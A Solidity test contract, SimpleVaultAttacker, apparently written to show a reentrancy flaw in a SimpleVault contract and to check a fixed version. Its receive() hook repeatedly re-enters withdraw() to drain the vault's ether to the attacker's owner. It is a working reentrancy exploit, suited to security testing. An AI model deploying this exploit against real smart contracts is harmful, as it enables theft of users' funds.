// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @dev Interfaz mínima común a SimpleVault y SimpleVaultFixed, para poder
///      reutilizar este mismo exploit contra ambas versiones en los tests.
interface IWithdrawVault {
    function deposit() external payable;
    function withdraw() external;
}

contract SimpleVaultAttacker {
    IWithdrawVault public immutable vault;
    address public immutable owner;
    uint256 public constant DRAIN_AMOUNT = 1 ether;

    constructor(address _vault) {
        vault = IWithdrawVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value == DRAIN_AMOUNT, "send 1 ether");
        vault.deposit{value: DRAIN_AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= DRAIN_AMOUNT) {
            vault.withdraw();
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
